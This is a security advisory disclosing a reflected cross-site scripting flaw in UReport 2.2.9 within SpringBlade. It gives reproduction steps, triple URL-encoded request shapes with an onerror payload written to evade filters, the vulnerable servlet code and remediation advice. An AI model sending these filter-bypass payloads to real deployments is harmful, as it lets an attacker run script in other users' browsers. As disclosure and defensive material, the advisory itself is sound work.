# UReport decoded exception-message reflected XSS

## Summary

Decoded file and _u values enter exception messages that UReportServlet.service writes directly to a 500 response without HTML encoding or a safe Content-Type.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated attacker; victim opens a crafted UReport error-path URL.

Verified flow: `triple-encoded file/_u -> double decode -> exception message -> pw.write(errorMsg) in a sniffable response`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Triple-encode an event-capable HTML marker so the request filter sees only encoded data.
2. Send it as a non-provider file to saveReportFile or as _u to loadData/loadPagePaper.
3. Confirm HTTP 500, no safe Content-Type, and the decoded marker in the response body.

Sanitized request shape used during verification:

```http
GET <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>
?file=xxURLENCODE×3('<img src=x onerror=self[`al`+`ert`](`gt48261022n4c`)>')

GET <BASE_URL>/blade-report/ureport/preview/loadData
blade-auth: bearer <JWT>
?_u=URLENCODE×3('<img src=x onerror=self[`al`+`ert`](`gt48261022r45c`)>')
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.


## Confirmed source and Sink

```text
DesignerServletAction.java:163-175 / HtmlPreviewServletAction.java:178-254
file = ReportUtils.decodeFileName(file);
throw new ReportDesignException("File [" + file + "] not found ...");

UReportServlet.java:81-92
catch (Exception ex) {
    String errorMsg = buildExceptionMessage(ex);
    pw.write(errorMsg);
}
```

Root cause: Repeated decoding restores filtered markup inside an exception string, and the generic servlet error handler writes it without encoding or a safe media type.

## Recommended remediation

Do not reflect decoded identifiers. Return a fixed JSON/text error with an explicit Content-Type and HTML-encode any value that must enter HTML.

## References

- Official source: https://github.com/youseries/ureport

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-04 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-04/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-04 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-04/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-04 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-04/03-source-github-v3.png)
